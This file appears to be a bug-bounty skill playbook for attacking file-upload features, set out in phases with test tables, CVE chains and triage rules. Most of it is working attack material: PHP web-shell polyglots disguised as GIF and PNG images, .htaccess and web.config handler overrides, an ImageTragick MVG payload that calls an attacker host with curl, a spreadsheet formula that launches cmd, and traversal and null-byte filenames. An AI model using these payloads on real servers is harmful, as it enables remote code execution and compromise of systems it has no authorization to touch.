---
name: hunt-file-upload
description: Arbitrary file upload — extension bypass, MIME confusion, polyglot, magic-byte, ImageMagick / library RCE.
keywords: [file upload, upload bypass, polyglot, magic bytes, content-type, imagemagick, ghostscript, exiftool]
---

# hunt-file-upload

## Triggers

"file upload", "upload bypass", "polyglot", "exiftool", "imagemagick".

## Phase 1 — what does the server check?

Probe with edge cases:

| Test | Detects |
|---|---|
| Upload `shell.php` | No extension check at all |
| `shell.php.png` | Last-extension check |
| `shell.phtml`, `.phar`, `.php5`, `.pht`, `.phpt` | Blacklist incomplete |
| `shell.Php` (case) | Case-sensitive check |
| `shell.png` with `Content-Type: application/x-php` | Trust client CT |
| `shell.png` with PHP body | Trust extension only |
| `shell.php; filename=image.png` | Header parsing quirk |
| `.htaccess` (Apache) or `web.config` (IIS) | Allows enabling handler |
| SVG (XML) | XXE / XSS in image context |
| HTML | Stored XSS on same-origin |
| TIFF / GIF with EXIF payload | ExifTool / ImageMagick chains |

## Phase 2 — magic-byte spoofing

Some servers check the first bytes. Build a polyglot:

```
GIF89a;
<?php system($_GET['c']); ?>
```

`GIF89a;` makes `file` and many libraries identify the file as a
valid GIF; PHP still executes the trailing code if the file is
served via PHP handler.

For PNG:

```
\x89PNG\r\n\x1a\n
<?php system($_GET['c']); ?>
```

## Phase 3 — extension handler manipulation

If the upload lands in a directory where the server runs `.htaccess`:

`.htaccess` content:
```
AddType application/x-httpd-php .png
```

Upload `.htaccess`, then upload `shell.png` with PHP body. Apache
processes `.png` as PHP.

IIS `web.config`:
```xml
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read,Script">
      <add name="x" path="*.png" verb="*" type="System.Web.UI.PageHandlerFactory" preCondition="integratedMode" />
    </handlers>
  </system.webServer>
</configuration>
```

## Phase 4 — ImageMagick / ExifTool RCE chains

Server-side image processing libraries have a history of RCE:

| CVE | Lib | Trigger |
|---|---|---|
| CVE-2016-3714 (ImageTragick) | ImageMagick | `mvg:` / `https://` URL in payload |
| CVE-2018-16509 (Ghost) | Ghostscript | PostScript via JPEG-2000 |
| CVE-2021-22204 (ExifTool) | ExifTool | DjVu metadata field |
| CVE-2022-44268 (ImageMagick PNG) | ImageMagick | PNG profile read of arbitrary file |
| CVE-2023-26604 (FILE) | systemd-resolved adjacent | misc |

ImageTragick payload (still found in wild!):

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/poc.png"|curl http://collab"&)'
pop graphic-context
```

Save as `poc.mvg`, upload — server's ImageMagick processes it.

## Phase 5 — chain templates

| Component | Reaches |
|---|---|
| SVG upload + XSS in `onload` | Stored XSS in same-origin |
| HTML upload + same-origin serving | Stored XSS |
| `.htaccess` enable handler + shell.png with PHP | RCE |
| ImageMagick MVG | RCE via image processor |
| zip slip in archive upload (see `hunt-path-traversal`) | RCE |
| Excel formula injection (`=cmd|' /C calc'!A0`) | Client-side RCE when opened |
| LibreOffice formula → headless conv | Server-side RCE |
| ICS calendar — RCE on Outlook (CVE-2024-21413) | Client-side |

## Phase 6 — content-disposition / filename quirks

Some apps use the uploaded filename as the disk filename. Try:

```
filename="../../../../var/www/html/shell.php"
filename="shell.php\x00.png"
filename="shell.php;"
filename="C:\\Windows\\Temp\\shell.exe"   (Windows)
```

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #209223 | SVG XSS via profile avatar |
| CVE-2016-3714 (ImageTragick) | MVG injection |
| CVE-2024-23897 + Jenkins file upload chain | Read secret → RCE |
| CVE-2025-31324 (SAP NetWeaver Visual Composer) | Unrestricted upload → RCE |
| H1 #1057296 | Polyglot PNG+PHP via `.phar` |

## Never-submit fallbacks

- Upload of "weird filename" without execution → KILL (no impact)
- HTML upload on a sandboxed origin (`*.usercontent.example.com`) →
  KILL (intentional sandboxing)
- SVG XSS in pure-display context with no auth cookies on the
  origin → DOWNGRADE

## See also

- `hunt-rce`
- `hunt-xss` (SVG vector)
- `hunt-path-traversal` (filename traversal)
- `hunt-deserialization` (.phar)
